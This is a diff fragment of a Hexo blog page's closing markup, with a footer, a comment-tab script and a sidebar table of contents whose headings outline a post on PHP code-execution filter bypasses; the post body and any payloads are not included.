+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="nav-number">1.</span> <span class="nav-text">无数字字母RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">核心代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP5"><span class="nav-number">1.2.</span> <span class="nav-text">PHP5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96"><span class="nav-number">1.2.1.</span> <span class="nav-text">^异或</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%96%E5%8F%8D"><span class="nav-number">1.2.2.</span> <span class="nav-text">~取反</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%96%E5%8F%8D%E8%A7%84%E5%88%99"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">取反规则</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="nav-number">1.2.2.1.1.</span> <span class="nav-text">举个例子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.2.1.2.</span> <span class="nav-text">计算过程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%8F%96%E5%8F%8D"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">如何取反</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%97%E6%AF%8D%E7%9B%B4%E6%8E%A5%E5%8F%96%E5%8F%8D"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">字母直接取反</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UTF-8"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">UTF-8</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%A2%9E"><span class="nav-number">1.2.3.</span> <span class="nav-text">++自增</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP7"><span class="nav-number">1.3.</span> <span class="nav-text">PHP7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">异或</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%96%E5%8F%8D-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">取反</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">各种过滤和绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="nav-number">1.4.1.</span> <span class="nav-text">过滤了_</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">过滤了;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-2"><span class="nav-number">1.4.3.</span> <span class="nav-text">过滤了$</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP7-1"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">PHP7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP5-1"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">PHP5</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">构造原理：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link"><span class="nav-number">1.4.3.2.1.1.</span> <span class="nav-text">&lt;?&#x3D; ?&gt;</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-number">1.4.3.2.1.2.</span> <span class="nav-text">反引号&#96;&#96;</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#-1"><span class="nav-number">1.4.3.2.1.3.</span> <span class="nav-text">.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8A%A0%E5%8F%B7"><span class="nav-number">1.4.3.2.1.4.</span> <span class="nav-text">加号 +</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8C%B9%E9%85%8D%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">1.4.3.2.1.5.</span> <span class="nav-text">匹配文件名</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E5%B0%8F%E4%BE%8B%E9%A2%98"><span class="nav-number">1.4.3.2.2.</span> <span class="nav-text">小小例题</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ed3n"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Ed3n</p>
+  <div class="site-description" itemprop="description">欢迎光临，我的朋友</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ed3n</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
